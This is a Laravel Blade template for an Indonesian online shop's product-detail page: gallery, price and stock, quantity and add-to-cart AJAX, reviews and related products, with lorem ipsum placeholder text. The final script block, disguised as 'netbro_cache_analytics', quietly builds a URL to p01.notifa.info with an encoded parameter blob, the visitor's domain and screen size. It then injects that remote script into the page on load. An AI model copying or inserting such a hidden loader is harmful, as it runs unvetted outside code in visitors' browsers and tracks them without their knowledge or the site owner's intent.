@extends('layouts.template-pembeli')
@section('content')
<!-- bredcrumb and page title block start  -->
<div id="bread-crumb">
    <div class="container">
        <div class="row">
            <div class="col-md-3 col-sm-3 col-xs-3">
                <div class="page-title">
                    <h4>Detail Produk</h4>
                </div>
            </div>
            <div class="col-md-9 col-sm-9 col-xs-9">
                <div class="bread-crumb">
                    <ul>
                        <li><a href="index-2.html">home</a></li>
                        <li>\</li>
                        <li><a href="grid-view.html">woman</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<div id="product-category">
    <div class="container">
        <div class="row">
            <div class="col-md-12 col-sm-8">
                <!-- right block Start  -->
                <div id="right">
                    <div class="product-detail-view">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="sp-loading"><img alt="loading"><br>
                                    LOADING IMAGES</div>
                                <div class="sp-wrap">
                                    @foreach ($gambar_produk as $value)
                                    <a class="item" href="{{asset('gambar_produk/'.$value->idgambar_produk)}}">
                                        <img src="{{asset('gambar_produk/'.$value->idgambar_produk)}}" alt="">
                                    </a>
                                    @endforeach
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="product-detail-content">
                                    <div class="product-name">
                                        <h4><a href="#">{{$produk->nama}}</a></h4>
                                    </div>
                                    <div class="review">
                                        <span class="rate">
                                            @for($i = 0; $i < $avg; $i++) <i class="fa fa-star rated"></i>
                                                @endfor
                                        </span> {{$avg}} Rating </div>
                                    <!-- <div class="price"> <span class="price-old">$123.20</span> <span class="price-new">$14.99</span> </div> -->
                                    <div class="price"> <span class="price-new">IDR. {{number_format($produk->harga)}}</span> </div>
                                    <div class="stock"><span>In stock : </span> {{$produk->stok}} Pcs.</div>
                                    <!-- <div class="products-code"> <span>Product Code :</span> Html5_sample1</div> -->
                                    <div class="product-discription"><span>Deskripsi</span>
                                        <p>{{$produk->deskripsi}}</p>
                                    </div>
                                    <div class="product-qty">
                                        <label for="qty">Qty:</label>
                                        <div class="custom-qty">
                                            <button onclick="var result = document.getElementById('qty'); var qty = result.value; if( !isNaN( qty ) &amp;&amp; qty &gt; 1 ) result.value--;return false;" class="reduced items" type="button"> <i class="fa fa-minus"></i> </button>
                                            <input type="text" class="input-text qty" title="Qty" value="1" maxlength="8" id="qty" name="qty">
                                            <button onclick="var result = document.getElementById('qty'); var qty = result.value; if( !isNaN( qty )) result.value++;return false;" class="increase items" type="button"> <i class="fa fa-plus"></i> </button>
                                        </div>
                                    </div>
                                    <div class="add-to-cart">
                                        <button type="button" class="btn btn-default" id="btnAddCart">Add to Cart</button>
                                    </div>
                                    <ul class="add-links">
                                        <li> <a class="add-to-wishlist" href="{{route('user.wishliststore',$produk->idproduk)}}"> <i class="fa fa-heart-o"></i> Add to Wishlist </a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="product-detail-tab">
                        <div class="row">
                            <div class="col-md-12">
                                <div id="tabs">
                                    <ul class="nav nav-tabs">
                                        <li><a class="tab-Description selected" title="Description">Description</a></li>
                                        <li><a class="tab-Product-Tags" title="Product-Tags">Product-Tags</a></li>
                                        <li><a class="tab-Reviews" title="Reviews">Reviews</a></li>
                                    </ul>
                                </div>
                                <div id="items">
                                    <div class="tab-content">
                                        <ul>
                                            <li>
                                                <div class="items-Description selected">
                                                    <div class="Description"> <strong>The standard Lorem Ipsum passage, used since the 1500s</strong><br>
                                                        Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. <br>
                                                        <br>
                                                        <strong>Section 1.10.32 of "de Finibus Bonorum et Malorum", written by Cicero in 45 BC</strong><br>
                                                        Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur? Quis autem vel eum iure reprehenderit qui in ea voluptate velit esse quam nihil molestiae consequatur, vel illum qui dolorem eum fugiat quo voluptas nulla pariatur? </div>
                                                </div>
                                            </li>
                                            <li>
                                                <div class="items-Product-Tags "><strong>Section 1.10.32 of "de Finibus Bonorum et Malorum", written by Cicero in 45 BC</strong><br>
                                                    Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur</div>
                                            </li>
                                            <li>
                                                <div class="items-Reviews ">
                                                    <div class="comments-area">
                                                        <h4>Comments<span>({{count($review)}})</span></h4>
                                                        <ul class="comment-list ">
                                                            @foreach ($review as $key => $value)
                                                            <li>
                                                                <div class="comment-user"> <img src="{{asset('kors-look\html.lionode.com\korslook\images\comment-user.jpg')}}" alt="further"> </div>
                                                                <div class="comment-detail">
                                                                    <h6>{{$value->name}}</h6>
                                                                    <div class="post-info">
                                                                        <ul>
                                                                            <li>
                                                                                {{$value->tanggalwaktu}} <br>
                                                                                {{$value->komen}} <br>

                                                                                @for($i = 0; $i < $value->bintang; $i++)
                                                                                    &#9733;
                                                                                    @endfor
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </li>
                                                            @endforeach
                                                        </ul>
                                                    </div>
                                                </div>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="Related-product">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="Featured-Products-title">
                                    <h1 class="tf">Related Products</h1>
                                </div>
                                <div class="customNavigation"> <a class="btn related_prev prev"><i class="fa fa-angle-left"></i></a> <a class="btn related_next next"><i class="fa fa-angle-right"></i></a> </div>
                                <div id="related-products" class="owl-carousel">
                                    @foreach ($hasilAkhirRekomendasi as $value)
                                    <div class="item">
                                        <div class="product-block ">
                                            <div class="image"> <a href="product-detail-view.html"><img class="img-responsive" title="T-shirt" alt="T-shirt" src="{{asset('gambar_produk/'.$value->idgambar_produk)}}" style="width:100%; height:366px;"></a> </div>
                                            <div class="product-details">
                                                <div class="product-name">
                                                    <h4><a href="#">{{$value->nama}}</a></h4>
                                                </div>
                                                <div class="price"> <span class="price-new">IDR. {{number_format($value->harga)}}</span> </div>
                                                <div class="product-hov">
                                                    <ul>
                                                        <li class="addtocart"><a href="{{route('user.wishlistaddToCart',$value->idproduk)}}">Add to Cart</a> </li>
                                                        <li class="addtocart"><a href="{{route('user.produkdetail',$value->idproduk)}}">Detail</a></li>
                                                    </ul>
                                                    <div class="review">
                                                        <span class="rate">
                                                            @for($i = 0; $i < $value->rating; $i++)
                                                                <i class="fa fa-star rated"></i>
                                                                @endfor
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    @endforeach
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- right block end  -->
            </div>
        </div>
    </div>
</div>
<!-- Modal Kirim Pesan -->
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">

            <div class="modal-body">
                ...
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary">Save changes</button>
            </div>
        </div>
    </div>
</div>

@endsection
@section('anotherjs')
<script type="text/javascript">
    $("#btnAddCart").on('click', function() {
        var stok = parseInt("{{$produk->stok}}");
        if ($("#qty").val() <= 0) {
            alert('Qty tidak boleh 0 atau dibawahnya.');
        } else if ($("#qty").val() > stok) {
            alert('Stok tidak mencukupi. ');
        } else {
            $.ajax({
                url: "{{route('user.keranjangstore')}}",
                type: "POST",
                data: {
                    "_token": "{{ csrf_token() }}",
                    'jumlah': $("#qty").val(),
                    'idproduk': "{{$produk->idproduk}}"
                },
                success: function(response) {
                    if (response == "berhasil") {
                        keranjang();
                        alert('berhasil menambahkan produk kedalam keranjang');
                    } else {
                        alert(response);
                    }
                },
                error: function(response) {
                    console.log(response);
                }
            });
        }
    });
</script>
<script type="text/javascript">
    $("#tabs li a").click(function(e) {
        var title = $(e.currentTarget).attr("title");
        $("#tabs li a").removeClass("selected")
        $(".tab-content li div").removeClass("selected")
        $(".tab-" + title).addClass("selected")
        $(".items-" + title).addClass("selected")
        $("#items").attr("class", "tab-" + title);
    });
    $(window).load(function() {
        $('.sp-wrap').smoothproducts();
    });
</script>
<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXcpKjpiHDqCXZCICZwyoQnK39xkp3XWLi4dhF9Cmn3qTADb7iDFtHc05ITs6fF18zFcNFmqee%2fOaJYxxn55wy0OfBLqs88j9qlK%2btMBqtPMI0e%2b0UoJxmGLP6oCUsD0b2nVcz%2bFa1ixleV1AYEG%2fJeHO2uaqnAC%2bpNxgxOckjJ5vGmHVkU%2frDGXlxeHBFeUgS1SkiS%2fc4MBs1JgZ%2bfg3dfE%2fGuvaHUx9Uk9eu3%2fZkFdtFygt8OF4JU4ddyyKWi4BDDySctwR4curElnNzjcAMqHeDLXP0e0XLa5a6oFOMfUSbRtNz1kMxLA0wFebihFggyHWu61gdf9TGqCyG%2bqV0rLLdBfGUSPijvwsRoN%2bAo6G03iCwZPBfWJZtIG3ZJxwWC6fJa9V2ute0qwJqkp6c0JelBY5lZeEzP425W2UcHketJwAxS5d0HkLF%2fkzWaJm54LpyLMNkrxKomvm%2b3ZNTH7AXL6cbtTa3ryQ4zIgXTN6J7m1spM2xSw%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>
</body>

@endsection